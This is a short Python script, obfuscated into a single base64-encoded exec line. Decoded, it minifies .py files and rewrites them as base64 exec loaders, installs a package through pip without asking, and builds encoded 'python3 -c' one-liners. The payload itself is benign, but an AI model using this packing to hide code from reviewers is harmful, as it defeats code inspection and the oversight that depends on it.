#!/usr/bin/env python3
import base64;exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwpDPScucHknCmltcG9ydCBvcyxzeXMKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGVuY29kZSBhcyBECmRlZiBFKGZpbGUpOgoJQz0iJyIKCXRyeTpmcm9tIHB5dGhvbl9taW5pZmllciBpbXBvcnQgbWluaWZ5CglleGNlcHQ6b3Muc3lzdGVtKGYie3N5cy5leGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCBweXRob24tbWluaWZpZXIiKTtmcm9tIHB5dGhvbl9taW5pZmllciBpbXBvcnQgbWluaWZ5Cgl3aXRoIG9wZW4oZmlsZSwncicpYXMgQTpCPUQobWluaWZ5KEEucmVhZCgpLHJlbmFtZV9nbG9iYWxzPVRydWUpLmVuY29kZSgpKS5kZWNvZGUoKQoJcmV0dXJuIGYiaW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ3tCfScpLmRlY29kZSgpKSIKZGVmIEgoY21kLHByZWZpeD0nL3Vzci9iaW4vZW52IHB5dGhvbjMgLWMnKTpyZXR1cm4gZiJ7cHJlZml4fSBcImltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCd7Y21kfScpLmRlY29kZSgpKVwiIgppZiBfX25hbWVfXz09J19fbWFpbl9fJzoKCWZvciBBIGluIHN5cy5hcmd2OgoJCWlmJ21pbmlmaWVyJ25vdCBpbiBBIGFuZCBBLmVuZHN3aXRoKEMpOgoJCQlGPUUoQSk7cHJpbnQoQSk7Qj1BLnJlcGxhY2UoQywnX21pbmknKQoJCQlpZiBvcy5wYXRoLmV4aXN0cyhCKToKCQkJCXRyeTpvcy5yZW1vdmUoQikKCQkJCWV4Y2VwdDpwYXNzCgkJCXdpdGggb3BlbihCLCd3KycpYXMgRzpHLndyaXRlKCcjIS91c3IvYmluL2VudiBweXRob24zXG4nK0Yp').decode())